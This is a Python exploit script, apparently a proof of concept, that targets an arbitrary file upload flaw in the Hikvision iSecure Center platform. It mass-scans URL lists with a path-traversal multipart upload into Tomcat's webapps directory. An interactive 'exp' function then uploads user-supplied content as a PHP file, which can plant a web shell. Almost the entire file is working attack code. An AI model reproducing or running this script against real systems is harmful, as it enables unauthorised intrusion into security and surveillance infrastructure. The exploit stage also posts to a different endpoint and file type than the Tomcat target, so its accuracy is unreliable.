import json

import requests,argparse,sys,os
from multiprocessing.dummy import Pool

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 海康威视安全漏洞扫描工                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个关于海康威视isecure center 综合安防管理平台任意文件上传漏洞的扫描脚本")
    parser.add_argument('-u', '-url', dest='url', type=str, help="Please enter URL")
    parser.add_argument('-f', '-file', dest='file', type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/center/api/files;.js"
    headers = {
        'User-Agent': 'python-requests/2.31.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '264',
        'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c',
    }
    data = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/QXQ.txt\"Content-Type: application/octet-stream\r\n\r\nHello This is QXQ\r\n--ea26cdac4990498b32d7a95ce5a5135c--\r\n\r\n\r\n"
    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5)
        if res1.status_code == 200 and 'data' in res1.text:
            res2 = requests.get(url=target + '/clusterMgr/QXQ.txt;.js', verify=False, timeout=5)
            if res2.status_code == 200:
                print(f"[+]{target} 存在任意文件上传")
                with open('海康威视_result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{target} 存在任意文件上传\n")
                    return True
        else:
            print(f"[-]{target} 不存在任意文件上传")
    except Exception as e:
        print(e)


def exp(target):
    try:
        put = input("请输入要上传的文件内容：")
        data = (
            "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\"; filename=\"QXQ.php\"\r\nContent-Type: application/x-php\r\n\r\n" + put + "\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
        )

        headers = {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": str(len(data))
        }
        payload = "/api/Common/uploadFile"

        res = requests.post(target + payload, headers=headers, data=data, verify=False)
        if res.status_code == 200:
            try:
                res_json = res.json()
                if res_json.get('msg') == "upload success":
                    data = res_json['data']
                    url = data['url']
                    print(f"上传成功！PHP文件地址：{url}")
                else:
                    print("文件上传失败")
            except json.JSONDecodeError:
                print("返回内容不是有效的 JSON")
        else:
            print(f"文件上传请求失败，状态码: {res.status_code}")
    except Exception as e:
        print(f"请求出错: {e}")




if __name__ == "__main__":
    main()
